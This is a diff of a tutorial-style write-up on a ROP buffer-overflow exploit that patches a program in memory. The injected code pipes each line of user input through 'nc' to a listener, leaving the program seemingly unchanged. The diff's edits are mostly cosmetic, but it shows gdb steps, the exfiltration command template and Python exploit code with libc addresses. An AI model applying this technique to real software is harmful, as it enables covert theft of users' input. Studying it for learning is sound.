@@ -60,7 +60,7 @@ We're gonna do something interesting: by exploting the vulnerability using ROP t
 
 For some extra fun, we'll do the following:
 
-1. Find the bytes we need somewhere in memory.
+Find the bytes we need somewhere in memory.
 
 ```
 (gdb) find/1b system, +999999999999, 0xe9, 0x9b, 0x02, 0x00, 0x00
@@ -68,7 +68,7 @@ For some extra fun, we'll do the following:
 1 pattern found.
 ```
 
-2. Use a custom function, which can copy any number of bytes from one memory location to another:
+Then use a custom function, which can copy any number of bytes from one memory location to another:
 
 ```
 def bncpy(dest, src, n):
@@ -84,7 +84,7 @@ def bncpy(dest, src, n):
 
 > You can modify `bncpy()` to use fewer instructions for longer sequences of bytes.
 
-We could of course put all needed bytes through `fscanf()` directly (as long as we avoid badchars), then use `bncpy()` or similar to copy the data to where we want it, but I think it's funny having `bncpy()` jump all over libc collecting tiny pieces here and there.
+We could of course put all needed bytes through `fscanf()` directly (as long as we avoid badchars), then use `bncpy()` or similar to copy the data to where we want it, but I think it's funny jumping all over libc collecting tiny pieces here and there.
 
 ### The exploit
 
@@ -145,10 +145,10 @@ To jump to our code cave, we turn the jump in `scanf@plt` to this:
 A template attack string is written to 0x401000. This will be used to generate a "fresh" attack string each time `scanf()` is called by `chat()`
 
 ```
-'echo                          | nc <IP> <PORT>' string to 0x401480
+'echo                          | nc <IP> <PORT>'
 ```
 
-The space is where the user input will go. Spaces are ignored by the shell, so we only have to make enough room for the maximum input length.
+The space is where the user input will go. Extra space characters are ignored by the shell, so we only have to make enough room for the maximum input length.
 
 We find the bytes we need in memory, and use `bncpy()` to write them all to memory.
 
@@ -238,7 +238,7 @@ After the program has been infected, the execution will continue at `main+15`
 #### Code for the complete exploit
 
 ```python
-# r2l2_exploit3.py
+# r2l3_exploit.py
 import struct
 
 # value found with ldd
@@ -271,31 +271,31 @@ def bncpy(dest, src, n):
 # write template attack string to 0x401400
 def writeEcho():
     dest = 0x401400
-    s = bncpy(dest, 0x7ffff7de49cc, 1) # e
+    s = bncpy(dest, 0x7ffff7de49cc, 1)   # e
     dest += 1
-    s += bncpy(dest, 0x7ffff7df73ea, 3) # cho
+    s += bncpy(dest, 0x7ffff7df73ea, 3)  # cho
     dest += 3
     s += bncpy(dest, 0x7ffff7f72870, 16) # 16 * " "
     dest += 16
     s += bncpy(dest, 0x7ffff7f72870, 16) # 16 * " "
     dest += 16
-    s += bncpy(dest, 0x7ffff7de451a, 1) # "|"
+    s += bncpy(dest, 0x7ffff7de451a, 1)  # "|"
     dest += 1
-    s += bncpy(dest, 0x7ffff7de6c3c, 2) # "nc"
+    s += bncpy(dest, 0x7ffff7de6c3c, 2)  # "nc"
     dest += 2
-    s += bncpy(dest, 0x7ffff7f72870, 1) # " "
+    s += bncpy(dest, 0x7ffff7f72870, 1)  # " "
     dest += 1
-    s += bncpy(dest, 0x7ffff7df66f6, 2) # "12"
+    s += bncpy(dest, 0x7ffff7df66f6, 2)  # "12"
     dest += 2
-    s += bncpy(dest, 0x7ffff7e1ff85, 2) # "7."
+    s += bncpy(dest, 0x7ffff7e1ff85, 2)  # "7."
     dest += 2
-    s += bncpy(dest, 0x7ffff7f6d48a, 4) # "0.0."
+    s += bncpy(dest, 0x7ffff7f6d48a, 4)  # "0.0."
     dest += 4
-    s += bncpy(dest, 0x7ffff7ec5b6b, 2) # "1 "
+    s += bncpy(dest, 0x7ffff7ec5b6b, 2)  # "1 "
     dest += 2
-    s += bncpy(dest, 0x7ffff7e63287, 2) # "56"
+    s += bncpy(dest, 0x7ffff7e63287, 2)  # "56"
     dest += 2
-    s += bncpy(dest, 0x7ffff7e63287, 2) # "56"
+    s += bncpy(dest, 0x7ffff7e63287, 2)  # "56"
     return s
 
 
@@ -448,7 +448,7 @@ Break at `chat()`'s call to `scanf()`:
 (gdb) b *chat+40
 ```
 
-Run the program, continue, enter any string at the prompt,and continue:
+Run the program, continue, enter any string at the prompt, and continue:
 
 ```bash
 (gdb) r
@@ -483,7 +483,7 @@ Remove the exploit data to prevent another buffer overflow:
 $ echo foo > /tmp/network
 ```
 
-Back in gdb, use `ni` to go execute our malicious code one instruction at a time. You will see the template string being copied, user input being accepted and copied to complete the "evil" string that will be used by system and so on.
+Back in gdb, use `ni` to go execute our malicious code one instruction at a time. You will see the template string being copied, user input being accepted and copied to complete the "evil" string that will be used by `system()` and so on.
 
 Disable breakpoints and continue the program to observe that it runs as usual for the user,  accepting input and printing output.
 
